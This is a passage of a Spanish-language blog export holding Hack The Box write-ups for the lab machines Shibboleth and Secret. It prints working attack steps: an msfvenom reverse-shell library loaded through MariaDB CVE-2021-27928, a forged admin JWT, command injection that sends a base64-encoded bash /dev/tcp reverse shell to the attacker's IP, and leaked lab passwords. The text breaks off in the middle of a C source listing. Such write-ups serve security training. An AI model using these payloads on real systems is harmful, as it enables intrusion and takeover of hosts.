-rw-rw-r-- 1 ipmi-svc ipmi-svc 22 Apr 24 2021 .vimrc zabbix@shibboleth:/$ cat user.txt cat: user.txt: Permission denied zabbix@shibboleth:/$ su ipmi-svc Password: ilovepumkinpie1 ipmi-svc@shibboleth:~$ cat user.txt 1338086b46c6078da513f7b3637099b8 ipmi-svc@shibboleth:~$ Privesc Vemos multiples puertos abiertos localmente, uno de ellos parece ser el de mysql y este ultimo esta siendo ejecutado por el usuario root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ipmi-svc@shibboleth:~$ netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:10050 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:10051 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp6 0 0 :::10050 :::* LISTEN - tcp6 0 0 :::10051 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - ipmi-svc@shibboleth:~$ ps -ef|grep mysql root 1227 1 0 00:28 ? 00:00:00 /bin/sh /usr/bin/mysqld_safe root 1402 1227 0 00:28 ? 00:00:16 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock root 1403 1227 0 00:28 ? 00:00:00 logger -t mysqld -p daemon error ipmi-svc 26604 26363 0 01:20 pts/2 00:00:00 grep --color=auto mysql ipmi-svc@shibboleth:~$ Si revisamos la version vemos que es 10.3.25 de MariaDB.\n1 2 3 ipmi-svc@shibboleth:~$ mysql --version mysql Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2 ipmi-svc@shibboleth:~$ Vemos que existe una vulnerabilidad que permite la ejecucion de comandos al modificar la variable wsrep_provider y afecta a la version de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 π ~/htb/shibboleth ❯ searchsploit mariadb ----------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------- --------------------------------- MariaDB 10.2 /MySQL - \u0026#39;wsrep_provider\u0026#39; OS Command Execution | linux/local/49765.txt MariaDB Client 10.1.26 - Denial of Service (PoC) | linux/dos/45901.txt MySQL / MariaDB - Geometry Query Denial of Service | linux/dos/38392.txt MySQL / MariaDB / PerconaDB 5.5.51/5.6.32/5.7.14 - Code Execution / Privileg | linux/local/40360.txt MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - \u0026#39;mysql\u0026#39; System User Privileg | linux/local/40678.c MySQL / MariaDB / PerconaDB 5.5.x/5.6.x/5.7.x - \u0026#39;root\u0026#39; System User Privilege | linux/local/40679.sh Oracle MySQL / MariaDB - Insecure Salt Generation Security Bypass | linux/remote/38109.pl ----------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results π ~/htb/shibboleth ❯ searchsploit -m linux/local/49765.txt Exploit: MariaDB 10.2 /MySQL - \u0026#39;wsrep_provider\u0026#39; OS Command Execution URL: https://www.exploit-db.com/exploits/49765 Path: /usr/share/exploitdb/exploits/linux/local/49765.txt File Type: ASCII text, with CRLF line terminators Copied to: /home/kali/htb/shibboleth/49765.txt π ~/htb/shibboleth ❯ cat 49765.txt # Exploit Title: MariaDB 10.2 /MySQL - \u0026#39;wsrep_provider\u0026#39; OS Command Execution # Date: 03/18/2021 # Exploit Author: Central InfoSec # Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL # Tested on: Linux # CVE : CVE-2021-27928 # Proof of Concept: # Create the reverse shell payload msfvenom -p linux/x64/shell_reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f elf-so -o CVE-2021-27928.so # Start a listener nc -lvp \u0026lt;port\u0026gt; # Copy the payload to the target machine (In this example, SCP/SSH is used) scp CVE-2021-27928.so \u0026lt;user\u0026gt;@\u0026lt;ip\u0026gt;:/tmp/CVE-2021-27928.so # Execute the payload π ~/htb/shibboleth ❯ Aun asi necesita de credenciales de acceso para mysql para ejecutar comandos - CVE-2021-27928. Tras realizar una busqueda de credenciales vemos en el archivo de configuracion de Zabbix unas credenciales de acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ipmi-svc@shibboleth:/etc/zabbix$ ls -lah ls -lah total 100K drwxr-xr-x 4 root root 4.0K Nov 8 11:02 . drwxr-xr-x 96 root root 4.0K Nov 8 11:02 .. -r-------- 1 zabbix zabbix 33 Apr 24 2021 peeesskay.psk drwxr-xr-x 2 www-data root 4.0K Apr 27 2021 web -rw-r--r-- 1 root root 15K May 25 08:27 zabbix_agentd.conf -rw-r--r-- 1 root root 16K Oct 18 09:24 zabbix_agentd.conf.dpkg-dist drwxr-xr-x 2 root root 4.0K Apr 27 2021 zabbix_agentd.d -rw-r----- 1 root ipmi-svc 22K Apr 24 2021 zabbix_server.conf -rw-r----- 1 root ipmi-svc 22K Oct 18 09:24 zabbix_server.conf.dpkg-dist ipmi-svc@shibboleth:/etc/zabbix$ cat zabbix_server.conf|grep -v \u0026#34;#\u0026#34; LogFile=/var/log/zabbix/zabbix_server.log LogFileSize=0 PidFile=/run/zabbix/zabbix_server.pid SocketDir=/run/zabbix DBName=zabbix DBUser=zabbix DBPassword=bloooarskybluh Exploit Siguiendo los pasos de la Explotacion creamos el payload utilizando msfvenom.\n1 2 3 4 5 6 7 8 π ~/htb/shibboleth ❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1335 -f elf-so -o cve.so [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf-so file: 476 bytes Saved as: cve.so π ~/htb/shibboleth ❯ Descargamos el payload en la maquina con wget y ejecutamos netcat a la escucha en el puerto 1335.\n1 2 3 ipmi-svc@shibboleth:/tmp$ ls cve.so cve.so ipmi-svc@shibboleth:/tmp$ Ingresamos a Mysql con las credenciales y actualizamos la variable wsrep_provider a nuestro payload.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ipmi-svc@shibboleth:/tmp$ mysql -u zabbix -p Password: bloooarskybluh Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 1082 Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [(none)]\u0026gt; SET GLOBAL wsrep_provider=\u0026#34;/tmp/cve.so\u0026#34;; ERROR 2013 (HY000): Lost connection to MySQL server during query MariaDB [(none)]\u0026gt; Shell Luego de ello obtuvimos una shell como usuario root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/shibboleth ❯ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.30] from shibboleth.htb [10.10.11.124] 53148 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@shibboleth:/var/lib/mysql# whoami; id root uid=0(root) gid=0(root) groups=0(root) root@shibboleth:/var/lib/mysql# cd /root root@shibboleth:/var/lib/mysql# ls root.txt scripts root@shibboleth:/root# cat root.txt f7b3b5b6e4e21c5fd57b6f0195ecfef4 root@shibboleth:/root# ","description":"Shibboleth expone IPMI por donde obtuvimos un hash que nos permitió acceder al panel de Zabbix, en este último logramos ejecutar commandos y acceder a la máquina. Reutilizando una contraseña nos dio acceso a un segundo usuario. Finalmente explotamos una vulnerabilidad en MySQL lo que nos permitió escalar privilegios.","id":31,"section":"posts","tags":["zabbix","ipmi","ffuf","metasploit","mySQL","CVE-2021-27928"],"title":"Hack The Box - Shibboleth","uri":"https://sckull.github.io/posts/shibboleth/"},{"content":"\rEn Secret obtuvimos acceso por medio de una API, tras analizar el codigo fuente logramos escalar privilegios y acceder tras realizar \u0026lsquo;Command Injection\u0026rsquo;. Escalamos privilegios tras generar un \u0026lsquo;CoreDump\u0026rsquo; que nos permitió acceder por SSH.\nNombre Secret OS Linux Puntos 20 Dificultad Facil IP 10.10.11.120 Maker z9fr\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.4, 5.1, 4.3, 5.7, 4.9],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: SSH (22), HTTP (80).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.91 scan initiated Mon Nov 22 01:00:54 2021 as: nmap -p22,80 -sC -sV -o nmap 10.10.11.120 Nmap scan report for 10.10.11.120 (10.10.11.120) Host is up (0.15s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DUMB Docs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Nov 22 01:01:09 2021 -- 1 IP address (1 host up) scanned in 14.80 seconds Web Site Realizando una solicitud con curl vemos en los headers X-Powered-By Express, suponiendo con esto que esta utilizando Express.js.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/secret ❯ curl -sI 10.10.11.120 HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Mon, 22 Nov 2021 01:23:06 GMT Content-Type: text/html; charset=utf-8 Content-Length: 12872 Connection: keep-alive X-Powered-By: Express ETag: W/\u0026#34;3248-nFUp1XavqYRgAFgHenjOsSPQ/e4\u0026#34; π ~/htb/secret ❯ Vemos que el sitio web ofrece informacion sobre un software y una API.\nEn la documentacion vemos las diferentes rutas y respuestas de la API, además encontramos una \u0026lsquo;demo\u0026rsquo; bajo la direccion /api.\nSe mencionan las rutas:\n/api/user/register : recibe valores en formato json, name, email, password para el registro de un usuario. /api/user/login : email y password son necesarios para que se genére un token de autenticacion JWT. /api/priv : necesita de un tonken de autenticacion JWT con privilegios de administrador. API Codigo Fuente Además de la informacion de la API tambien encontramos el codigo fuente en un archivo ZIP. Dentro de este encontramos un repositorio y, con git logs vemos la descripción de los cambios hechos desde su creación.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -\u0026gt; master) Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Thu Sep 9 00:03:27 2021 +0530 now we can view logs from server 😃 commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:30:17 2021 +0530 removed .env for security reasons commit de0a46b5107a2f4d26e348303e76d85ae4870934 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:29:19 2021 +0530 added /downloads commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:27:35 2021 +0530 removed swap commit 3a367e735ee76569664bf7754eaaade7c735d702 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:26:39 2021 +0530 added downloads commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:25:52 2021 +0530 first commit Al revisar el historial de cambios vemos el token_secret en el archivo .env el cual no esta presente en su ultima versión.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:30:17 2021 +0530 removed .env for security reasons diff --git a/.env b/.env index fb6f587..31db370 100644 --- a/.env +++ b/.env @@ -1,2 +1,2 @@ DB_CONNECT = \u0026#39;mongodb://127.0.0.1:27017/auth-web\u0026#39; -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE +TOKEN_SECRET = secret En el ultimo cambio realizado para \u0026lsquo;ver los logs del servidor\u0026rsquo; vemos que ejecuta git con el nombre del archivo pasado en file: git log --oneline ${file}. Con esto podríamos ejecutar comandos (Command Injection) en el servidor ya que no tiene algun tipo de filtro. Además se accede por la ruta privada (/priv) que, verifica que el usuario sea theadmin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 # git show e297a2797a5f62b6011654cf6fb6ccb6712d2d5b commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -\u0026gt; master) Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Thu Sep 9 00:03:27 2021 +0530 now we can view logs from server 😃 diff --git a/routes/private.js b/routes/private.js index 1347e8c..cf6bf21 100644 --- a/routes/private.js +++ b/routes/private.js @@ -11,10 +11,10 @@ router.get(\u0026#39;/priv\u0026#39;, verifytoken, (req, res) =\u0026gt; { if (name == \u0026#39;theadmin\u0026#39;){ res.json({ - role:{ - - role:\u0026#34;you are admin\u0026#34;, - desc : \u0026#34;{flag will be here}\u0026#34; + creds:{ + role:\u0026#34;admin\u0026#34;, + username:\u0026#34;theadmin\u0026#34;, + desc : \u0026#34;welcome back admin,\u0026#34; } }) } @@ -26,7 +26,32 @@ router.get(\u0026#39;/priv\u0026#39;, verifytoken, (req, res) =\u0026gt; { } }) } +}) + +router.get(\u0026#39;/logs\u0026#39;, verifytoken, (req, res) =\u0026gt; { + const file = req.query.file; + const userinfo = { name: req.user } + const name = userinfo.name.name; + + if (name == \u0026#39;theadmin\u0026#39;){ + const getLogs = `git log --oneline ${file}`; + exec(getLogs, (err , output) =\u0026gt;{ + if(err){ + res.status(500).send(err); + return + } + res.json(output); + }) + } + else{ + res.json({ + role: { + role: \u0026#34;you are normal user\u0026#34;, + desc: userinfo.name.name + } + }) + } }) router.use(function (req, res, next) { @@ -40,4 +65,4 @@ router.use(function (req, res, next) { }); -module.exports = router \\ No newline at end of file +module.exports = router Revisando el codigo fuente vemos que la ruta /logs solo verifica que el usuario sea theadmin (private.js) y que el token de autenticacion ha sido creado con el valor de TOKEN_SECRET (verifytoken.js).\njavascript\rjavascript\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 //private.js router.get(\u0026#39;/logs\u0026#39;, verifytoken, (req, res) =\u0026gt; { const file = req.query.file; const userinfo = { name: req.user } const name = userinfo.name.name; if (name == \u0026#39;theadmin\u0026#39;){ const getLogs = `git log --oneline ${file}`; exec(getLogs, (err , output) =\u0026gt;{ if(err){ res.status(500).send(err); return } res.json(output); }) } else{ res.json({ role: { role: \u0026#34;you are normal user\u0026#34;, desc: userinfo.name.name } }) } }) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //verifytoken.js const jwt = require(\u0026#34;jsonwebtoken\u0026#34;); module.exports = function (req, res, next) { const token = req.header(\u0026#34;auth-token\u0026#34;); if (!token) return res.status(401).send(\u0026#34;Access Denied\u0026#34;); try { const verified = jwt.verify(token, process.env.TOKEN_SECRET); req.user = verified; next(); } catch (err) { res.status(400).send(\u0026#34;Invalid Token\u0026#34;); } }; Si verificamos el proceso de creación de el token de autenticación vemos que simplemente utiliza: id, name, email, TOKEN_SECRET.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 //auth.js const jwt = require(\u0026#39;jsonwebtoken\u0026#39;) [.. snip ..] // login router.post(\u0026#39;/login\u0026#39;, async (req , res) =\u0026gt; { [.. snip ..] // create jwt const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET ) res.header(\u0026#39;auth-token\u0026#39;, token).send(token); }) Dasith - User Admin Creamos un pequeño archivo para generar un token de autenticacion utilizando la informacion disponible del usuario theadmin en el sitio web.\n1 2 3 const jwt = require(\u0026#39;jsonwebtoken\u0026#39;) const token = jwt.sign({ _id: \u0026#34;1\u0026#34;, name: \u0026#34;theadmin\u0026#34; , email: \u0026#34;root@dasith.works\u0026#34;}, \u0026#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE\u0026#39; ) console.log(token); Tras generar el token verificamos el mismo en la ruta /priv donde nos mostró que tenemos el rol de admin por lo que podriamos acceder a /logs.\n1 2 3 4 5 π local-web/routes master ✗ ❯ nodejs token_htb.js eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxIiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJyb290QGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNzU0NTYwNX0.4t7NrhnpS8Gu5VEb8-O3W1nXfwaPsakpatwfwEBFt60 π local-web/routes master ✗ ❯ curl -s http://10.10.11.120/api/priv -H \u0026#34;auth-token: eyJhbGciO[.. snip... ]-O3W1nXfwaPsakpatwfwEBFt600\u0026#34; {\u0026#34;creds\u0026#34;:{\u0026#34;role\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;theadmin\u0026#34;,\u0026#34;desc\u0026#34;:\u0026#34;welcome back admin\u0026#34;}}% π local-web/routes master ✗ ❯ Como sabemos se esta utilizando el mismo codigo o almenos parte de este en el sitio web de la maquina, enviamos el archivo index.js para verificar el log de este archivo. Tras ello vemos que se muestra la descripcion del ultimo cambio en el archivo.\n1 2 3 π ~/htb/secret ❯ curl -s \u0026#34;http://10.10.11.120:3000/api/logs?file=index.js\u0026#34; -H \u0026#34;auth-token: eyJhbGciO[.. snip... ]-O3W1nXfwaPsakpatwfwEBFt60\u0026#34; \u0026#34;ab3e953 Added the codes\\n\u0026#34;% π ~/htb/secret ❯ Creamos una shell inversa codificando esta en base64 para luego agregar comandos para ejecutar la misma, que finalmente codificamos en URL.\n1 2 3 4 5 6 7 8 π ~/htb/secret ❯ echo -n \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/1337 0\u0026gt;\u0026amp;1\u0026#34; | base64 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMC8xMzM3IDA+JjE= # Commando # echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMC8xMzM3IDA+JjE=|base64 -d|bash # URL encode # echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4zMC8xMzM3IDA%2BJjE%3D%7Cbase64%20%2Dd%7Cbash Finalmente enviamos una petición en /log para ejecutar nuestra shell inversa.\n1 π ~/htb/secret ❯ curl -s \u0026#34;http://10.10.11.120:3000/api/logs?file=;echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4zMC8xMzM3IDA%2BJjE%3D%7Cbase64%20%2Dd%7Cbash\u0026#34; -H \u0026#34;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxIiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJyb290QGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNzU0NTYwNX0.4t7NrhnpS8Gu5VEb8-O3W1nXfwaPsakpatwfwEBFt60\u0026#34; Shell Como resultado obtuvimos una shell inversa con el usuario dasith y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 π ~/htb/secret ❯ nc -lvp 1337 listening on [any] 1337 ... connect to [10.10.14.30] from 10.10.11.120 [10.10.11.120] 45360 bash: cannot set terminal process group (1111): Inappropriate ioctl for device bash: no job control in this shell dasith@secret:~/local-web$ dasith@secret:~/local-web$ whoami; id dasith uid=1000(dasith) gid=1000(dasith) groups=1000(dasith) dasith@secret:~/local-web$ dasith@secret:~/local-web$ cd dasith@secret:~$ ls local-web user.txt dasith@secret:~$ cat user.txt 9ee8bd4de541c76f9f5799c6eb8b868d dasith@secret:~$ Privesc Tras realizar una enumeracion de ficheros con permisos SUID encontramos /opt/count.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 dasith@secret:~$ find / -perm -4000 2\u0026gt;/dev/null| xargs ls -lah find / -perm -4000 2\u0026gt;/dev/null| xargs ls -lah -rwsr-xr-x 1 root root 18K Oct 7 10:03 /opt/count [.. snip ..] -rwsr-xr-x 1 root root 84K Jul 14 22:08 /usr/bin/chfn -rwsr-xr-x 1 root root 52K Jul 14 22:08 /usr/bin/chsh -rwsr-xr-x 1 root root 39K Mar 7 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 87K Jul 14 22:08 /usr/bin/gpasswd -rwsr-xr-x 1 root root 55K Jul 21 2020 /usr/bin/mount -rwsr-xr-x 1 root root 44K Jul 14 22:08 /usr/bin/newgrp -rwsr-xr-x 1 root root 67K Jul 14 22:08 /usr/bin/passwd -rwsr-xr-x 1 root root 31K May 26 11:50 /usr/bin/pkexec -rwsr-xr-x 1 root root 67K Jul 21 2020 /usr/bin/su -rwsr-xr-x 1 root root 163K Jan 19 2021 /usr/bin/sudo -rwsr-xr-x 1 root root 39K Jul 21 2020 /usr/bin/umount -rwsr-xr-- 1 root messagebus 51K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 15K Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 463K Jul 23 12:55 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 23K May 26 11:50 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 128K Sep 9 14:34 /usr/lib/snapd/snap-confine dasith@secret:~$ La ejecucion de dicho fichero aparentemente realiza la lectura del archivo que recibe y cuenta el numero de lineas, caracteres y palabras, tambien, tiene la opcion de guardar el resultado en un archivo. Vemos en este caso el archivo user.txt y u.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 dasith@secret:~$ /opt/count Enter source file/directory name: /home/dasith/user.txt /home/dasith/user.txt Total characters = 33 Total words = 2 Total lines = 2 Save results a file? [y/N]: y Path: /home/dasith/u.txt dasith@secret:~$ ls local-web user.txt u.txt dasith@secret:~$ cat u.txt Total characters = 33 Total words = 2 Total lines = 2 dasith@secret:~$ En la carpeta de dicho fichero encontramos lo que parece ser el codigo fuente de acuerdo a las fechas de los archivos. Además vemos un archivo log valgrid.\n1 2 3 4 5 6 7 8 9 10 dasith@secret:/opt$ ls -lah ls -lah total 56K drwxr-xr-x 2 root root 4.0K Oct 7 10:06 . drwxr-xr-x 20 root root 4.0K Oct 7 15:01 .. -rw-r--r-- 1 root root 3.7K Oct 7 10:01 code.c -rw-r--r-- 1 root root 16K Oct 7 10:01 .code.c.swp -rwsr-xr-x 1 root root 18K Oct 7 10:03 count -rw-r--r-- 1 root root 4.6K Oct 7 10:04 valgrind.log dasith@secret:/opt$ En el codigo fuente, vemos dos funciones que realizan la lectura y un contador de los archivos, tambien que realiza la lectura de archivos simbolicos y de directorios con sus respectivos permisos. Finalmente la funcion principal que es la encargada de la ejecucion de cada una de las funciones y la entrada de los valores.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 //cat code.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;sys/prctl.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;linux/limits.h\u0026gt; void dircount(const char *path, char *summary) { DIR *dir; char fullpath[PATH_MAX]; struct dirent *ent; struct stat fstat; int tot = 0, regular_files = 0, directories = 0, symlinks = 0; if((dir = opendir(path)) == NULL) { printf(\u0026#34;\\nUnable to open directory.\\n\u0026#34;); exit(EXIT_FAILURE); } while ((ent = readdir(dir)) != NULL) { ++tot; strncpy(fullpath, path, PATH_MAX-NAME_MAX-1); strcat(fullpath, \u0026#34;/\u0026#34;); strncat(fullpath, ent-\u0026gt;d_name, strlen(ent-\u0026gt;d_name)); if (!lstat(fullpath, \u0026amp;fstat)) { if(S_ISDIR(fstat.st_mode)) { printf(\u0026#34;d\u0026#34;); ++directories; } else if(S_ISLNK(fstat.st_mode)) { printf(\u0026#34;l\u0026#34;); ++symlinks; } else if(S_ISREG(fstat.st_mode)) { printf(\u0026#34;-\u0026#34;); ++regular_files; } else printf(\u0026#34;?\u0026#34;); printf((fstat.st_mode \u0026amp; S_IRUSR) ? \u0026#34;r\u0026#34; : \u0026#34;-\u0026#34;); printf((fstat.st_mode \u0026amp; S_IWUSR) ? \u0026#34;w\u0026#34; : \u0026#34;-\u0026#34;); printf((fstat.st_mode \u0026amp; S_IXUSR) ? \u0026#34;x\u0026#34; : \u0026#34;-\u0026#34;); printf((fstat.st_mode \u0026amp; S_IRGRP) ? \u0026#34;r\u0026#34; : \u0026#34;-\u0026#34;); printf((fstat.st_mode \u0026amp; S_IWGRP) ? \u0026#34;w\u0026#34; : \u0026#34;-\u0026#34;); printf((fstat.st_mode \u0026amp; S_IXGRP) ? \u0026#34;x\u0026#34; : \u0026#34;-\u0026#34;); printf((fstat.st_mode \u0026amp; S_IROTH) ? \u0026#34;r\u0026#34; : \u0026#34;-\u0026#34;); printf((fstat.st_mode \u0026amp; S_IWOTH) ? \u0026#34;w\u0026#34; : \u0026#34;-\u0026#34;); printf((fstat.st_mode \u0026amp; S_IXOTH) ? \u0026#34;x\u0026#34; : \u0026#34;-\u0026#34;); } else { printf(\u0026#34;??????????\u0026#34;); } printf (\u0026#34;\\t%s\\n\u0026#34;, ent-\u0026gt;d_name); } closedir(dir); snprintf(summary, 4096, \u0026#34;Total entries = %d\\nRegular files = %d\\nDirectories = %d\\nSymbolic links = %d\\n\u0026#34;, tot, regular_files, directories, symlinks); printf(\u0026#34;\\n%s\u0026#34;, summary); } void filecount(const char *path, char *summary) { FILE *file; char ch; int characters, words, lines; file = fopen(path, \u0026#34;r\u0026#34;); if (file == NULL) { printf(\u0026#34;\\nUnable to open file.\\n\u0026#34;); printf(\u0026#34;Please check if file exists and you have read privilege.\\n\u0026#34;); exit(EXIT_FAILURE); } characters = words = 